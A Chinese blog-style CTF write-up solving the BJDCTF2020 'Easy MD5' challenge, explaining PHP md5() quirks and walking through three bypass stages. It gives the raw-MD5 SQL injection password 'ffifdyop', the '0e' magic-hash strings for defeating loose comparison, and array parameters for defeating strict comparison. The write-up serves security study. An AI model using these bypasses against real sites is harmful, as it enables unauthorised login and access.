2025年10月22日23:28:02，满血复活！玩了一天游戏，开刷！

buuoj

# [BJDCTF2020]Easy MD5

简单的md5，看来和md5-hash有关

网页源代码没线索，框中是用GET方法传入的password参数，查询也没有回显，

还给了一个github链接：https://github.com/BjdsecCA/BJDCTF2020

看了一下是wp的合集，还是先不要看题解吧（笑

没有什么线索的时候，用burpsuite抓包试试看：

没想到这次线索藏在response的报头里！长见识了：

hint: select * from 'admin' where password=md5($pass,true)

看来我们传入的password在经过一个md5(_,true)之后作为了sql查询的条件，

不过其实这个md5函数是在php里实现的，这样写应该只是为了作为提示。

----

关于md5():

- 语法：
    - string md5($str,raw)
- 参数：
    - $str:是一个字符构成的字符串
    - raw:指定十六进制或ascii字符输出格式
- 返回值：
    - 计算成功就返回md5值；失败则返回false

1. 基础使用
   
```php
echo md5('hello');
```

output:

```php
5d41402abc4b2a76b9719d911017c592
```

2. 输出格式(raw)

原始的md5编码应该是一个128位的二进制数，
当raw为true，将其每8位分隔，每一段转换为0-255的ascii编码字符，返回这个字符串；
当raw为false，将其每4位分隔，每一段转换成hex数0-f，返回这个16进制数

```php
var_dump(md5('hello', true));
var_dump(md5('hello', false));
```

Output:

```php
string(16) "]A@*�K*v�q��Œ"
string(32) "5d41402abc4b2a76b9719d911017c592"
```

3. 科学计数法（0e绕过）
   
MD5遇到公式的时候会先进行运算，再根据运算结果来计算md5.

这里的"公式"包括，科学计数法，以及一般的算术运算，还有处理字符串的功能：

当字符串与数字类型运算时，会将字符串转换成数字类型，再参与运算，最后计算运算结果的MD5值。

数字相同时，数值型和字符串的计算结果是相同的。

```php
echo md5(0).PHP_EOL;
echo md5(0e123).PHP_EOL;
echo md5(0e456).PHP_EOL;
echo md5(0E456);

echo md5(1+2).PHP_EOL;
echo md5(3).PHP_EOL;
echo md5(1*2).PHP_EOL;
echo md5(2).PHP_EOL;
echo md5(1&1).PHP_EOL;
echo md5(true);

echo md5('1'+2).PHP_EOL;
echo md5(3).PHP_EOL;
echo md5('1'*2).PHP_EOL;
echo md5(2);
```

Output:

```php
cfcd208495d565ef66e7dff9f98764da
cfcd208495d565ef66e7dff9f98764da
cfcd208495d565ef66e7dff9f98764da
cfcd208495d565ef66e7dff9f98764da

eccbc87e4b5ce2fe28308fd9f2a7baf3
eccbc87e4b5ce2fe28308fd9f2a7baf3
c81e728d9d4c2f636f067f89cc14862c
c81e728d9d4c2f636f067f89cc14862c
c4ca4238a0b923820dcc509a6f75849b
c4ca4238a0b923820dcc509a6f75849b

eccbc87e4b5ce2fe28308fd9f2a7baf3
eccbc87e4b5ce2fe28308fd9f2a7baf3
c81e728d9d4c2f636f067f89cc14862c
c81e728d9d4c2f636f067f89cc14862c
```

注意到0exxxx全都会被parse成0，利用这点我们可以得到一个绕过弱比较(==)思路：

```
var_dump(md5(0e123) === md5(0e456));
var_dump(md5(0e123) == md5(0e456));
```

Output:

```
bool(true)
bool(true)
```

0e绕过还有一种变体：如果某个字符串的MD5值是0e开头的，在比较时，PHP也会先把它计算成 0，再参与比较。

```php
echo md5('QNKCDZO').PHP_EOL;
var_dump(md5('QNKCDZO') == 0);
```

Output:

```php
0e830400451993494058024219903391
bool(true)
```

一些md5值为0e开头的字符串：

> QNKCDZO   => 0e830400451993494058024219903391
> 240610708 => 0e462097431906509019562988736854
> s878926199a => 0e545993274517709034328855841020
> s155964671a => 0e342768416822451524974117254469
> s214587387a => 0e848240448830537924465865611904
> s214587387a => 0e848240448830537924465865611904

4. 数组类型

MD5()不可以处理数组，数组都会返回null，同时会报一个不影响执行的Warning

```php
var_dump(md5([1,2]));
var_dump(md5([3,4]));
```

Output:

```php
Warning: md5() expects parameter 1 to be string,
NULL
Warning: md5() expects parameter 1 to be string,
NULL
```

绕过思路，遇到强比较(a===b)的时候，可以使用数组绕过，用a[]=1&a[]=2来传递GET数组。

```php
$a = array(1,2,3);
$b = array(4,5,6);
 
var_dump(md5($a)===md5($b));
```

Output:

```php
Warning: md5() expects parameter 1 to be string,
Warning: md5() expects parameter 1 to be string,
bool(true)
```

----

在这里我们使用一个md5万能密码：

ffifdyop

其Md5的hex值是：

276f722736c95d99e921722cf9ed621c

其ascii形式是：

'or'6???????????

其中?代表的是一些乱码之类的，总之这样就足够了，因为sql会把这样的以数字开头的字符串在bool需求下转换成true！

所以可以说简直是神来之笔，这个必须狠狠记下来了。

因此我们传入这个万能密码：

来到了下一步，这次html代码里就有线索：

```php
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
```

这里是弱比较，直接用一手我们新学的0e绕过：

?a=QNKCDZO&b=240610708

用这几个字符串，因为毕竟要求a,b不相等

下一步：

```php

<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 

```

这次是强不相等，就让我们使用一手数组绕过吧！

param1[]=1&param1[]=2&param2[]=3&param2[]=4

返回为Null的时候可以满足强相等！

得到flag。








